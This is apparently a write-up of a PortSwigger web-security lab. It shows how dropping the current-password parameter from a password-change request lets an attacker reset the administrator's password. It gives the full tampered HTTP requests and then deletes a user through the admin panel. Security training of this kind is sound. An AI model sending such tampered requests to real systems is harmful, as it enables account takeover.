## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/8b2f4c7d-dac7-4eed-bbfb-f5868c7fe009)

## Overview :

Users won't always supply mandatory input

One misconception is that users will always supply values for mandatory input fields. Browsers may prevent ordinary users from submitting a form without a required input, but as we know, attackers can tamper with parameters in transit. This even extends to removing parameters entirely.

This is a particular issue in cases where multiple functions are implemented within the same server-side script. In this case, the presence or absence of a particular parameter may determine which code is executed. Removing parameter values may allow an attacker to access code paths that are supposed to be out of reach.

When probing for logic flaws, you should try removing each parameter in turn and observing what effect this has on the response. You should make sure to:

- Only **remove one parameter at a time** to ensure all relevant code paths are reached.
- Try **deleting the name of the parameter as well as the value**. The server will typically handle both cases differently.
-  Follow multi-stage processes through to completion. Sometimes **tampering with a parameter in one step will have an effect on another step** further along in the workflow.

This applies to both URL and POST parameters, but don't forget to check the cookies too. This simple process can reveal some bizarre application behavior that may be exploitable. 

## Solution :

The lab description says that **user's privilege level based on their input.** So by somehow abusing this logic flaw we need to gain admin privileges.

Login as wiener using the credentials provided.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/0e492a61-c242-4996-b14f-c65f60b0c4a2)


As expected since weiner is a normal user, he is not allowed to access the */admin* panel.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b2876937-500b-4f4b-91ce-78dfdb199cff)

### Logic flaw in password change functionality -

When we enter current password and old password to change the password of a user, the following POST request is sent to*/my-account/change-password* endpoint.

```
POST /my-account/change-password HTTP/2
Host: 0afe00810380bc5c80fc3f99008700ed.web-security-academy.net
Cookie: session=DpIOVFlAqspfHJuDzXmVBehUyiO60xFh
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: https://0afe00810380bc5c80fc3f99008700ed.web-security-academy.net
Referer: https://0afe00810380bc5c80fc3f99008700ed.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf=hDmgDzvRuQsMkrIMeamKQa2NiAjlViHD&username=wiener&current-password=peter&new-password-1=1212&new-password-2=1212
```

So as per this lab's overview, we can try to remove a parameter/remove a parameter and value & see if anything wierd happens.

In the above request to change the password, we can see that the **password change happens for the username that is being provided**.

> This is typically dangerous since  in the password change functionality, if it is dependant on the username then an attacker can try to enter the username as admin & change the password.

#### Removing the  `&current-password=` parameter -

When we remove the **&current-password=** parameter, notice that the server accepts the request and changes the password of wiener.

```
csrf=hDmgDzvRuQsMkrIMeamKQa2NiAjlViHD&username=wiener&new-password-1=1212&new-password-2=1212
```

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/49914567-41b8-4df0-8ccb-f486bb7896c8)

### Resetting admin's password -

So this time we use this logic flaw to reset the password of administrator user.

In the form fill the username as **administrator**, and remove the  **&current-password=** parameter.

The POST request now looks like this .

```
POST /my-account/change-password HTTP/2
Host: 0afe00810380bc5c80fc3f99008700ed.web-security-academy.net
Cookie: session=DpIOVFlAqspfHJuDzXmVBehUyiO60xFh
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Origin: https://0afe00810380bc5c80fc3f99008700ed.web-security-academy.net
Referer: https://0afe00810380bc5c80fc3f99008700ed.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf=hDmgDzvRuQsMkrIMeamKQa2NiAjlViHD&username=administrator&new-password-1=thisisnew&new-password-2=thisisnew
```
And we've finally changed/resetted the password of admin user.We can login as admin now using the password we just set.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/4d0305cd-1955-4255-915e-ea275f0ec5b4)

Go to the admin panel & delete the user carlos to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/174b4f7f-b1ae-49bf-b96a-994211f188d0)
